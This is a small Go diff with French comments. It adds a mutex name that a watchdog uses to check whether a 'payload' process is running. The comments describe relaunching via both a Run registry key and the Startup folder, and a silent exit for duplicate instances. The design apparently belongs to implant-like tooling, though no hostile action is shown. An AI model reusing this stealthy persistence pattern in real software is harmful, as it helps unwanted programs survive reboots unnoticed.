@@ -55,6 +55,10 @@ func writeLog(line string) {
 	f.Close()
 }
 
+// instanceMutexName porte le nom du mutex : le watchdog le teste pour savoir
+// si le payload tourne encore.
+var instanceMutexName = `Local\PayloadInstance`
+
 // singleInstance garde un seul processus : clé Run et Démarrage le relancent
 // ensemble au démarrage de Windows, et un second lancement manuel ne doit pas
 // doubler le payload. Le second processus sort immédiatement, sans message.
